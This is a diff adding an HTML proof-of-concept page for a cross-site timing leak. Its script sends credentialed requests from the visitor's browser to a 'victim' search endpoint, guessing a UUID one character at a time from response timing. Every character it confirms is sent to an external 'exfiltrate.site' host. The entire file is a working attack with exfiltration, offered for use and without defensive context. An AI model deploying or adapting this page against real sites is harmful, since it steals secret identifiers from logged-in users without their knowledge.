@@ -1,0 +1,43 @@
+<html>
+    
+    <head title='XS Leak PoC'>
+        
+    </head>
+    <body>
+         <script>
+             
+var url_base ='http://victim/search?search=^'; //So it starts from the beginning
+var char_set = '0123456789-abcdef'.split(""); //charset to be part from the key known UUID
+function guesser(current_str, position){
+    url = url_base + current_str + char_set[position].toString();
+    var actual_value = current_str + char_set[position].toString();
+    v = performance.now();
+    fetch(url,
+        {method: 'GET', credentials:'include', mode: 'no-cors'}
+        ).catch(err => {
+            console.log('ERROR using: ' + actual_value);
+        }).then(response =>{
+            z = performance.now();
+            if(z - v < 3000){
+                document.write("<br/> "+ actual_value + " Not valid character - Request took: " + (z-v).toString() + 'seconds')
+            } else {
+                document.write("<br/> FOUND! " + actual_value + "is valid, trying to guess next one..");
+                j=0;
+                fetch('https://exfiltrate.site/?leak=' + actual_value);
+                while(j < char_set.length){
+                    guesser(actual_value,j);
+                    j+=1;
+                }
+            }
+        })
+
+
+}
+i= 0
+while(i<char_set.length){
+    setTimeout(guesser("",i),500*i);
+    i+=1;
+}
+         </script>
+    </body>
+</html>
